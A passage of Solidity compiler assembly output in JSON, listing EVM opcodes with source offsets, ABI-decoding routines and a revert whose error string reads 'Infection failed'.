								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "38"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "38"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 924,
									"end": 930,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 932,
									"end": 938,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 981,
									"end": 983,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 969,
									"end": 978,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 960,
									"end": 967,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 956,
									"end": 979,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 952,
									"end": 984,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "42"
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "43"
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 987,
									"end": 1066,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "tag",
									"source": 1,
									"value": "43"
								},
								{
									"begin": 987,
									"end": 1066,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "tag",
									"source": 1,
									"value": "42"
								},
								{
									"begin": 949,
									"end": 1068,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1107,
									"end": 1108,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "44"
								},
								{
									"begin": 1188,
									"end": 1195,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1179,
									"end": 1185,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1168,
									"end": 1177,
									"name": "DUP7",
									"source": 1
								},
								{
									"begin": 1164,
									"end": 1186,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 1132,
									"end": 1196,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "44"
								},
								{
									"begin": 1132,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1122,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 1122,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1078,
									"end": 1206,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1245,
									"end": 1247,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "45"
								},
								{
									"begin": 1327,
									"end": 1334,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1318,
									"end": 1324,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1307,
									"end": 1316,
									"name": "DUP7",
									"source": 1
								},
								{
									"begin": 1303,
									"end": 1325,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 1271,
									"end": 1335,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "tag",
									"source": 1,
									"value": "45"
								},
								{
									"begin": 1271,
									"end": 1335,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1261,
									"end": 1335,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1261,
									"end": 1335,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1216,
									"end": 1345,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1352,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1358,
									"end": 1456,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 1358,
									"end": 1456,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1409,
									"end": 1415,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1443,
									"end": 1448,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1437,
									"end": 1449,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 1427,
									"end": 1449,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1427,
									"end": 1449,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1358,
									"end": 1456,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1358,
									"end": 1456,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1358,
									"end": 1456,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1358,
									"end": 1456,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1462,
									"end": 1609,
									"name": "tag",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 1462,
									"end": 1609,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1563,
									"end": 1574,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1600,
									"end": 1603,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1585,
									"end": 1603,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1585,
									"end": 1603,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1462,
									"end": 1609,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 1462,
									"end": 1609,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1462,
									"end": 1609,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1462,
									"end": 1609,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1462,
									"end": 1609,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1615,
									"end": 1754,
									"name": "tag",
									"source": 1,
									"value": "24"
								},
								{
									"begin": 1615,
									"end": 1754,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1704,
									"end": 1710,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1699,
									"end": 1702,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1694,
									"end": 1697,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 1688,
									"end": 1711,
									"name": "MCOPY",
									"source": 1
								},
								{
									"begin": 1745,
									"end": 1746,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1736,
									"end": 1742,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 1731,
									"end": 1734,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 1727,
									"end": 1743,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1720,
									"end": 1747,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 1615,
									"end": 1754,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1615,
									"end": 1754,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1615,
									"end": 1754,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1615,
									"end": 1754,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1760,
									"end": 2146,
									"name": "tag",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 1760,
									"end": 2146,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1864,
									"end": 1867,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1892,
									"end": 1930,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "50"
								},
								{
									"begin": 1924,
									"end": 1929,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1892,
									"end": 1930,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 1892,
									"end": 1930,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1892,
									"end": 1930,
									"name": "tag",
									"source": 1,
									"value": "50"
								},
								{
									"begin": 1892,
									"end": 1930,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1946,
									"end": 2034,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "51"
								},
								{
									"begin": 2027,
									"end": 2033,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 2022,
									"end": 2025,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1946,
									"end": 2034,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 1946,
									"end": 2034,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1946,
									"end": 2034,
									"name": "tag",
									"source": 1,
									"value": "51"
								},
								{
									"begin": 1946,
									"end": 2034,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1939,
									"end": 2034,
									"name": "SWAP4",
									"source": 1
								},
								{
									"begin": 1939,
									"end": 2034,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2043,
									"end": 2108,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "52"
								},
								{
									"begin": 2101,
									"end": 2107,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 2096,
									"end": 2099,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 2089,
									"end": 2093,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 2082,
									"end": 2087,
									"name": "DUP7",
									"source": 1
								},
								{
									"begin": 2078,
									"end": 2094,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 2043,
									"end": 2108,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "24"
								},
								{
									"begin": 2043,
									"end": 2108,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2043,
									"end": 2108,
									"name": "tag",
									"source": 1,
									"value": "52"
								},
								{
									"begin": 2043,
									"end": 2108,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2133,
									"end": 2139,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 2128,
									"end": 2131,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 2124,
									"end": 2140,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 2117,
									"end": 2140,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 2117,
									"end": 2140,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1868,
									"end": 2146,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1760,
									"end": 2146,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 1760,
									"end": 2146,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1760,
									"end": 2146,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1760,
									"end": 2146,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1760,
									"end": 2146,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2152,
									"end": 2423,
									"name": "tag",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 2152,
									"end": 2423,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2282,
									"end": 2285,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 2304,
									"end": 2397,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "54"
								},
								{
									"begin": 2393,
									"end": 2396,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 2384,
									"end": 2390,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 2304,
									"end": 2397,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 2304,
									"end": 2397,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2304,
									"end": 2397,
									"name": "tag",
									"source": 1,
									"value": "54"
								},
								{
									"begin": 2304,
									"end": 2397,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2297,
									"end": 2397,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 2297,
									"end": 2397,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2414,
									"end": 2417,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 2407,
									"end": 2417,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 2407,
									"end": 2417,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2152,
									"end": 2423,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 2152,
									"end": 2423,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 2152,
									"end": 2423,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2152,
									"end": 2423,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2152,
									"end": 2423,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2429,
									"end": 2598,
									"name": "tag",
									"source": 1,
									"value": "26"
								},
								{
									"begin": 2429,
									"end": 2598,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2513,
									"end": 2524,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 2547,
									"end": 2553,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 2542,
									"end": 2545,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 2535,
									"end": 2554,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 2587,
									"end": 2591,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 2582,
									"end": 2585,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 2578,
									"end": 2592,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 2563,
									"end": 2592,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 2563,
									"end": 2592,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2429,
									"end": 2598,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 2429,
									"end": 2598,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 2429,
									"end": 2598,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2429,
									"end": 2598,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2429,
									"end": 2598,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2604,
									"end": 2770,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 2604,
									"end": 2770,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2744,
									"end": 2762,
									"name": "PUSH",
									"source": 1,
									"value": "496E66656374696F6E206661696C656400000000000000000000000000000000"
								},
								{
									"begin": 2740,
									"end": 2741,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 2732,
									"end": 2738,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 2728,
									"end": 2742,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 2721,
									"end": 2763,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 2604,
									"end": 2770,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2604,
									"end": 2770,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2776,
									"end": 3142,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 2776,
									"end": 3142,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2918,
									"end": 2921,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 2939,
									"end": 3006,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "58"
								},
								{
									"begin": 3003,
									"end": 3005,
									"name": "PUSH",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 2998,
									"end": 3001,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 2939,
									"end": 3006,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "26"
								},
								{
									"begin": 2939,
									"end": 3006,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 2939,
									"end": 3006,
									"name": "tag",
									"source": 1,
									"value": "58"
								},
								{
									"begin": 2939,
									"end": 3006,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 2932,
									"end": 3006,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 2932,
									"end": 3006,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 3015,
									"end": 3108,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "59"
								},
								{
									"begin": 3104,
									"end": 3107,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 3015,
									"end": 3108,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 3015,
									"end": 3108,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 3015,
									"end": 3108,
									"name": "tag",
									"source": 1,
									"value": "59"
								},
								{
									"begin": 3015,
									"end": 3108,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 3133,
									"end": 3135,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 3128,
									"end": 3131,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 3124,
									"end": 3136,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 3117,
									"end": 3136,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 3117,
									"end": 3136,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2776,
									"end": 3142,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 2776,
									"end": 3142,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 2776,
									"end": 3142,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 2776,
									"end": 3142,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 3148,
									"end": 3567,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 3148,
									"end": 3567,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 3314,
									"end": 3318,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 3352,
									"end": 3354,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 3341,
									"end": 3350,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 3337,
									"end": 3355,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 3329,
									"end": 3355,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 3329,
									"end": 3355,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 3401,
									"end": 3410,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 3395,
									"end": 3399,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 3391,
									"end": 3411,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 3387,
									"end": 3388,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 3376,
									"end": 3385,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 3372,
									"end": 3389,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 3365,
									"end": 3412,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 3429,
									"end": 3560,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "61"
								},
								{
									"begin": 3555,
									"end": 3559,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 3429,
									"end": 3560,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 3429,
									"end": 3560,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 3429,
									"end": 3560,
									"name": "tag",
									"source": 1,
									"value": "61"
								},
								{
									"begin": 3429,
									"end": 3560,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 3421,
									"end": 3560,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 3421,
									"end": 3560,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 3148,
									"end": 3567,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 3148,
									"end": 3567,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 3148,
									"end": 3567,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 3148,
									"end": 3567,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 0,
									"end": 382,
									"name": "tag",
									"source": 0,
									"value": "14"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 0,
									"end": 382,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 0,
									"end": 382,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 0,
									"end": 382,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 382,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212201340d7c46579a0c510b0c09cc75cea69e1948ab2da9fd28e47d9e6af1613055964736f6c634300081d0033",
									".code": [
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "186F0354"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "48EB76EE"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 0,
											"end": 382,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 28,
											"end": 47,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 28,
											"end": 47,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH",
